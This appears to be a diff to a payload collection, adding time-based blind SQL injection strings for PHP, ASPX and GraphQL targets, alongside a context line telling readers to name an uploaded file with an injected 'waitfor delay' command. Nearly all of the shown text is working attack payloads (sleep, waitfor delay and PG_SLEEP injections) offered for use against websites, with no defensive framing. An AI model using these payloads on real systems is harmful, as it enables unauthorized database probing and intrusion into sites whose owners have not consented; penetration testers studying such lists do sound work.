@@ -54,6 +54,16 @@ Save file with this names and upload it in site
 pic.png;waitfor delay '0:0:5'-- 
 ```
 
+php
+
+(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
+
+aspx
+
+orwa';%20waitfor%20delay%20'0:0:6'%20--%20
+
+graphql
+orwa') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
 
 Refrence:
 
